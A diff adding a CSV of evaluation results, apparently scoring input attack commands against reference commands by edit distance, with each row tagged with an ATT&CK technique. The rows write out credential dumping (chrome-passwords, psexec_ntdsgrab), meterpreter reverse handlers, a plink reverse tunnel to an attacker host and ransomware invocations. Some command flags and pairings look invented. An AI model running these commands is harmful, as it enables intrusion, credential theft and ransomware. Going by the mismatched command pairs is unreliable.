@@ -1,0 +1,14 @@
+file,tool,input_command,matched_command,edit_score,match_found
+command_chrome_passwords_TA0006_T1555.txt,chrome passwords,chrome-passwords,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`",0.438,True
+command_chrome_passwords_TA0006_T1555.txt,chrome passwords,chrome-passwords -c,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`",0.421,True
+command_chrome_passwords_TA0006_T1555.txt,chrome passwords,chrome-passwords -p,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`",0.421,True
+command_metasploit_TA0042_T1587.txt,metasploit,use auxiliary/scanner/discovery/http_anonymizer,"```sh
+msf> use auxiliary/admin/smb/psexec_ntdsgrab
+```",0.396,True
+command_metasploit_TA0042_T1587.txt,metasploit,set payload windows/meterpreter/reverse_tcp,[msf] > `handler -H 0.0.0.0 -P 443 -p windows/x64/meterpreter/reverse_https`,0.588,True
+command_metasploit_TA0042_T1587.txt,metasploit,set RHOSTS <attacker_ssh_user>@192.168.0.4,`meterpreter > powershell_import /home/<attacker>/carbanak/Resources/step6/powerview.ps1`,0.29,True
+command_metasploit_TA0042_T1587.txt,metasploit,store_loot store_file.txt -f <file_path>,`msf> loot -t screenspy.screenshot`,0.32,True
+command_metasploit_TA0042_T1587.txt,metasploit,run,`sudo msfconsole`,0.2,True
+command_plink_TA0011_T1219.txt,plink,plink.exe -i <attacker_ssh_private_key> root@<target_machine_IP> -R 3389:localhost:3389,"`plink.exe -pw ""<attacker_ssh_user_password>"" <attacker_ssh_user>@192.168.0.4 -R 3389:localhost:3389`",0.553,True
+command_ryuk_TA0002_T1204.txt,ryuk,ryuk.exe -e --drop-bat-files,`ryuk.exe --encrypt --process-name notepad.exe`,0.48,True
+command_ryuk_TA0009_T1113.txt,ryuk,ryuk.exe /capture,`ryuk.exe --encrypt --process-name notepad.exe`,0.438,True
